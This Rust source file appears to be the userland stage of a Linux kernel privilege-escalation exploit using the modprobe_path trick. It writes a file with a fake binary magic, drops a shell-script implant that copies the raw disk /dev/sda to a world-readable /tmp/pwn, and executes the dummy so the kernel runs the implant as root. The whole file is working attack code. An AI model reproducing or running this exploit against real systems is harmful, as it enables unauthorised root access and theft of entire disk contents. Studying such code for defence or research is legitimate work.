use std::ffi::OsStr;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::prelude::OsStrExt;
use std::os::unix::process::CommandExt;
use std::process::Command;

const DUMMY_FILE: &str = "/tmp/dummy";

pub fn abuse_modprobe() {
    eprintln!("[+] We are back in userland");
    create_dummy();
    create_implant();

    eprintln!("[+] We have written the dummy file");
    Command::new(DUMMY_FILE).exec();
}

fn create_dummy() {
    const FAKE_MAGIC: u32 = 0xffffffff;

    let mut dummy = OpenOptions::new()
        .create(true)
        .read(true)
        .write(true)
        .mode(0x777)
        .open(DUMMY_FILE)
        .unwrap();
    dummy
        .write_all(&FAKE_MAGIC.to_ne_bytes())
        .expect("can write to created file");
}

fn create_implant() {
    const IMPLANT_CONTENT: &str = "#!/bin/sh\ncat /dev/sda> /tmp/pwn\nchmod 777 /tmp/pwn";

    let file = OsStr::from_bytes(&crate::IMPLANT[..7]);
    let mut implant = OpenOptions::new()
        .create(true)
        .read(true)
        .write(true)
        .mode(0x777)
        .open(file)
        .unwrap();
    implant
        .write_all(IMPLANT_CONTENT.as_bytes())
        .expect("can write to created file");
}
